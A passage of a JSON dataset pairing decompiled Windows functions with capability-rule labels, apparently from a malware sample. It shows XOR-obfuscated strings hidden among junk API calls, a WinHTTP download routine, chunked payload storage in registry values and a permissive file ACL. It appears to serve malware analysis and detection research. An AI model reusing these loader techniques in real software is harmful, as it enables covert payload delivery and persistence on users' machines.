lpMultiByteStr = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41daa0, puVar7, 0x50, 0);\n    var_34h = 0x5547313c;\n    var_30h = 0x33415420;\n    var_2ch = 0x316e5426;\n    var_28h = 0x547b551c;\n    var_24h = 0x54263314;\n    var_20h = 0x5516316e;\n    var_1ch = 0x331e5430;\n    var_18h._0_2_ = 0x5455;\n    var_ch = 0x55333154;\n    var_8h = CONCAT31(var_8h._1_3_, 0x54);\n    uVar1 = (*pcVar6)(8, 0x3d);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar2 = 0;\n    var_fch = &var_34h - iVar5;\n    var_4ch = iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        puVar7 = lpdwNumberOfBytesAvailable;\n        if (iVar3 != 0x337109) {\n            *(iVar2 + iVar5) = *(&var_ch + iVar2 % var_40h) ^ (iVar2 + iVar5)[var_fch];\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar5, lpdwNumberOfBytesAvailable, 0x50);\n    uVar1 = (*pcVar6)(0, puVar7);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    puVar4 = hRequest;\n    if (lpMultiByteStr == 0) {\n        arg_8h = 1;\n        goto code_r0x00401a9a;\n    }\n    if (hRequest == NULL) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(hRequest);\n        uVar1 = (*pcVar6)(8, (iVar5 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar4, 0xffffffff, lpdwNumberOfBytesAvailable, iVar5 + 1);\n    }\n    var_44h = 0x6a777625;\n    var_40h = 0x76624223;\n    var_ch = 0x6a327662;\n    var_8h = CONCAT22(var_8h._2_2_, 0x4277);\n    uVar1 = (*pcVar6)(8, 0x11);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    hRequest = &var_44h - iVar2;\n    var_fch = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        puVar7 = lpdwNumberOfBytesAvailable;\n        if (iVar3 != 0x2746b2) {\n            *(iVar5 + iVar2) = *(&var_ch + iVar5 % 6) ^ (iVar5 + iVar2)[hRequest];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 8);\n    puVar4 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                       (lpMultiByteStr, iVar2, lpdwNumberOfBytesAvailable, 0, 0, 0, 0x800140);\n    hRequest = puVar4;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar7);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    iVar5 = var_4ch;\n    if (puVar4 == NULL) {\ncode_r0x00401a73:\n        arg_8h = 1;\n    }\n    else {\n        var_10ch = 0x3300;\n        var_110h = 8;\n        iVar3 = fcn.0040b963();\n        if (iVar3 != 0) {\n            var_8h = 0;\n            var_ch = &var_41ch;\n            lpBuffer = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar4, 0x26, &lpBuffer, 0xc);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar4, 0x1f, &var_10ch, 4);\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar4, 0x3f, &var_110h, 4);\n        if (lpdwNumberOfBytesRead != 0) {\n            var_38h = 0x6c316600;\n            var_34h = 0x66356939;\n            var_30h = 0x696d6c35;\n            var_2ch = 0x6c326672;\n            var_28h = 0x6626692e;\n            var_24h = 0x69246c35;\n            var_20h = 0x6c75666f;\n            var_1ch = 0x667f6933;\n            var_18h._0_2_ = 0x6c50;\n            var_ch = 0x6c506652;\n            var_8h = CONCAT22(var_8h._2_2_, 0x6957);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x45);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar2 = 0;\n            lpdwNumberOfBytesAvailable = &var_38h - iVar5;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                if (iVar3 != 0x2435cb) {\n                    *(iVar2 + iVar5) = *(&var_ch + iVar2 % 6) ^ *((&var_38h - iVar5) + iVar2 + iVar5);\n                }\n                iVar2 = iVar2 + 1;\n            } while (iVar2 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar5, lpdwNumberOfBytesRead);\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            puVar4 = hRequest;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(hRequest, &lpszHeaders, uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar5 = var_4ch;\n            iVar2 = var_fch;\n        }\n        iVar3 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(puVar4, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar3 == 0) || (iVar3 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(puVar4, 0),  iVar3 == 0))\n        goto code_r0x00401a73;\n        lpdwBufferLength = 4;\n        var_f8h = 0;\n        var_f4h = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar4, 0x20000005, 0, &var_f8h, &lpdwBufferLength, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_f8h;\n        }\n        lpdwBufferLength = 4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar4, 0x20000013, 0, &var_f4h, &lpdwBufferLength, 0);\n        if ((var_f4h == 0xce) || (var_f4h == 200)) {\n            if (var_48h[1] == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_f8h);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                *var_48h = 0;\n                var_48h[1] = iVar3;\n            }\n            hRequest = var_48h[1];\n            lpdwNumberOfBytesRead = 0;\n            do {\n                lpdwNumberOfBytesAvailable = NULL;\n                iVar3 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(puVar4, &lpdwNumberOfBytesAvailable);\n                if ((iVar3 == 0) ||\n                   (iVar3 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                      (puVar4, *var_48h + hRequest, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead)\n                   ,  iVar3 == 0)) {\n                    arg_8h = 4;\n                    goto code_r0x00401a7a;\n                }\n                *var_48h = *var_48h + lpdwNumberOfBytesRead;\n                iVar3 = *var_48h;\n            } while (lpdwNumberOfBytesAvailable != NULL);\n            *arg_14h = iVar3;\n            if ((*arg_10h == 0) || (iVar3 == *arg_10h)) {\n                arg_8h = 0;\n            }\n        }\n        else {\n            arg_8h = 3;\n        }\n    }\ncode_r0x00401a7a:\n    if (puVar4 != NULL) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(puVar4);\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\ncode_r0x00401a9a:\n    uVar1 = (*pcVar6)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    if (lpMultiByteStr != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(lpMultiByteStr);\n    }\n    return arg_8h;\n}\n",
        "token_count": 4561
    },
    "00402f4f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00402f4f(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.0040d469();\n        if (var_4h == 0) {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 277
    },
    "00403ab6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00403ab6(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint ARG_0;\n    uint lpValueName;\n    uint32_t var_58h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    int32_t hKey;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_20h = var_20h & 0xffffff00;\n    var_50h = param_1;\n    var_ch = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if ((((uVar2 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_58h = uVar2;\n        fcn.0040392d();\n        hKey = fcn.004038d4(0x20006);\n        if (hKey != 0) {\n            var_44h = *param_1;\n            var_3ch = 0x55275416;\n            var_38h = 0x4e35745d;\n            var_34h = 0x540d3327;\n            var_30h = 0x745e5507;\n            var_2ch = 0x33324e35;\n            var_28h = 0x556b5411;\n            var_4ch = (((var_44h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar7 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_24h = 0x4e547457;\n            puVar7 = &lpValueName;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_8h = 0x554e5474;\n            var_4h._0_1_ = 0x33;\n            uVar1 = (*pcVar5)(8, 0x39);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            var_40h = 5;\n            iVar6 = 0;\n            var_54h = iVar4;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n                if (iVar3 != 0xc5393a) {\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_40h) ^ (iVar6 + iVar4)[&var_3ch - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, var_ch);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            var_ch = 0;\n            var_18h = 0x32403760;\n            var_14h = 0x3312452b;\n            var_10h = 0x37457456;\n            var_8h = 0x32333745;\n            var_4h._0_1_ = 0x74;\n            do {\n                uVar1 = (*pcVar5)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_1ch = &var_18h - iVar4;\n                do {\n                    iVar3 = (*pcVar5)();\n                    if (iVar3 != 0x9041a0) {\n                        *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_40h) ^ (iVar6 + iVar4)[var_1ch];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0xc);\n                puVar7 = &lpValueName;\n                for (iVar6 = 0x40; iVar3 = var_ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_ch);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                uVar1 = (*pcVar5)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                var_ch = iVar3 + 1;\n            } while (var_ch < 0x32);\n            var_1ch = 0;\n            if (0 < var_4ch) {\n                var_ch = 0;\n                var_18h = 0x32403760;\n                var_14h = 0x3312452b;\n                var_10h = 0x37457456;\n                var_8h = 0x32333745;\n                var_4h._0_1_ = 0x74;\n                do {\n                    uVar1 = (*pcVar5)(8, 0x19);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar6 = 0;\n                    var_20h = &var_18h - iVar4;\n                    do {\n                        iVar3 = (*pcVar5)();\n                        if (iVar3 != 0x9041a0) {\n                            *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_40h) ^ (iVar6 + iVar4)[var_20h];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0xc);\n                    puVar7 = &lpValueName;\n                    for (iVar6 = 0x40; iVar3 = var_1ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_1ch);\n                    iVar6 = 0x7d000;\n                    if (var_44h < 0x7d000) {\n                        iVar6 = var_44h;\n                    }\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_50h[1] + var_ch, iVar6);\n                    var_20h = -iVar6 & 0xffffff00U | 1 - (iVar6 != 0);\n                    uVar1 = (*pcVar5)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    var_1ch = iVar3 + 1;\n                    var_ch = var_ch + 0x7d000;\n                    var_44h = var_44h + -0x7d000;\n                } while (var_1ch < var_4ch);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar1 = (*pcVar5)(0, var_54h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar2 = var_58h;\n        }\n        uVar1 = (*pcVar5)(0, uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return uVar2 & 0xffffff00 | var_20h & 0xff;\n}\n",
        "token_count": 2025
    },
    "00403dd2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00403dd2(int32_t *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    code *pcVar11;\n    uint ARG_0;\n    uint lpValueName;\n    int32_t var_74h;\n    int32_t var_70h;\n    uchar *var_68h;\n    uchar *var_64h;\n    int32_t *var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uchar *var_50h;\n    uchar *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpType;\n    uchar *lpcbData;\n    int32_t hKey;\n    uint var_1h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_60h = param_1;\n    lpType = param_2;\n    uVar2 = (*pcVar11)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_5ch = iVar3;\n        fcn.0040392d();\n        var_70h = fcn.004038d4(0x20019);\n        if (var_70h != 0) {\n            var_58h = 0;\n            var_48h = 0x55275416;\n            puVar9 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_44h = 0x4e35745d;\n            puVar9 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_40h = 0x540d3327;\n            var_3ch = 0x745e5507;\n            var_38h = 0x33324e35;\n            var_34h = 0x556b5411;\n            var_30h = 0x4e547457;\n            var_20h = 0x554e5474;\n            var_1ch = CONCAT31(var_1ch._1_3_, 0x33);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            var_54h = 5;\n            iVar8 = 0;\n            var_74h = iVar3;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n                if (iVar4 != 0xc5393a) {\n                    *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_54h) ^ (iVar8 + iVar3)[&var_48h - iVar3];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar3, lpType);\n            var_2ch = 0x32403760;\n            var_28h = 0x3312452b;\n            var_24h = 0x37457456;\n            var_18h = 0x32333745;\n            var_14h._0_1_ = 0x74;\n            do {\n                pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puVar9 = &var_20h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                puVar9 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                hKey = &var_2ch - iVar3;\n                var_1ch = iVar3;\n                do {\n                    iVar5 = (*pcVar11)();\n                    iVar4 = var_58h;\n                    if (iVar5 != 0x9041a0) {\n                        *(iVar8 + iVar3) = *(&var_18h + iVar8 % var_54h) ^ (iVar8 + iVar3)[hKey];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar3, &ARG_0, var_58h);\n                var_1h._0_1_ = '\\0';\n                var_4ch = NULL;\n                var_58h = iVar4 + 1;\n                var_50h = NULL;\n                hKey = fcn.004038d4(0x20019);\n                param_1 = var_60h;\n                if (hKey != 0) {\n                    lpType = 3;\n                    lpcbData = NULL;\n                    var_68h = NULL;\n                    iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    if (iVar8 == 0) {\n                        uVar2 = (*pcVar11)(8, lpcbData);\n                        var_64h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        puVar7 = var_68h;\n                        puVar6 = var_68h;\n                        if ((var_64h == NULL) ||\n                           (iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (hKey, &lpValueName, 0, &lpType, var_64h, &lpcbData),  puVar7 = var_64h, \n                           puVar6 = lpcbData,  iVar8 == 0)) {\n                            var_1h._0_1_ = '\\x01';\n                            var_50h = puVar6;\n                            var_4ch = puVar7;\n                        }\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                    if (((var_1h != '\\0') && (var_4ch != NULL)) && (var_50h != NULL)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*pcVar11)(8, var_50h);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*pcVar11)(0, param_1[1], var_50h + *param_1);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar6 = var_4ch;\n                        puVar10 = iVar3 + *param_1;\n                        for (puVar7 = var_50h; puVar7 != NULL; puVar7 = puVar7 + -1) {\n                            *puVar10 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar10 = puVar10 + 1;\n                        }\n                        *param_1 = var_50h + *param_1;\n                        pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4ch);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        iVar3 = var_1ch;\n                    }\n                }\n                uVar2 = (*pcVar11)(0, iVar3);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_70h);\n            uVar2 = (*pcVar11)(0, var_74h);\n            (*pcVar1)(uVar2);\n            iVar3 = var_5ch;\n        }\n        uVar2 = (*pcVar11)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2238
    },
    "00404384": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00404384(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 562
    },
    "00404c9d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404c9d(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_78h;\n    int32_t var_74h;\n    int32_t lpMem;\n    uint lpcchSize;\n    int32_t var_68h;\n    uint ARG_0;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint lpFileName;\n    uint lpProfileDir;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_dh;\n    uint var_9h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    lpFileName = (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    ARG_0 = (*pcVar5)(uVar2);\n    lpcchSize = 0x104;\n    var_30h = 0x6f5d511d;\n    var_2ch._0_2_ = 0x662f;\n    var_2ch._2_1_ = 0x30;\n    stack0xffffffd3 = 0x6c6f5e51;\n    stack0xffffffd7 = 0x57510266;\n    stack0xffffffdb = 0x2566386f;\n    stack0xffffffdf = 0x226f5b51;\n    stack0xffffffe3 = 0x41513666;\n    var_18h._3_1_ = 0x6f;\n    var_14h._0_2_ = 0x6610;\n    var_60h = 5;\n    var_14h._2_1_ = 5;\n    stack0xffffffeb = 0x216f5751;\n    var_dh._0_1_ = 0x66;\n    var_dh._1_1_ = 0x21;\n    var_dh._2_1_ = 0x51;\n    var_dh._3_1_ = 0x32;\n    var_9h._0_1_ = 0x6f;\n    stack0xfffffff4 = 0x6f325151;\n    var_4h._0_2_ = 0x664c;\n    uVar2 = (*pcVar1)(8, 0x51);\n    iVar3 = (*pcVar5)(uVar2);\n    var_50h = 6;\n    iVar6 = 0;\n    var_68h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar4 != 0xd6fbd1) {\n            *(iVar6 + iVar3) = *(&var_9h + iVar6 % var_50h + 1) ^ (iVar6 + iVar3)[&var_30h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x28);\n    var_30h = 0x36487503;\n    var_2ch._0_2_ = 0x5632;\n    var_2ch._2_1_ = 6;\n    stack0xffffffd3 = 0x36365975;\n    stack0xffffffd7 = 0x64752356;\n    stack0xffffffdb = 0x2d560e36;\n    stack0xffffffdf = 0x23365b75;\n    stack0xffffffe3 = 0x64752e56;\n    var_18h._3_1_ = 0x36;\n    var_14h._0_2_ = 0x5616;\n    var_14h._2_1_ = 0x27;\n    stack0xffffffeb = 0x32365575;\n    var_dh._0_1_ = 0x56;\n    var_dh._1_1_ = 0x42;\n    var_dh._2_1_ = 0x75;\n    stack0xfffffff4 = 0x36387542;\n    var_4h._0_2_ = 0x5642;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    var_78h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    lpMem = var_78h;\n    var_34h = &var_30h - var_78h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        uVar2 = lpProfileDir;\n        if (iVar6 != 0x3d616d) {\n            *(iVar3 + var_78h) = *(&var_9h + iVar3 % var_50h + 1) ^ (iVar3 + var_78h)[&var_30h - var_78h];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x26);\n    var_74h = var_68h;\n    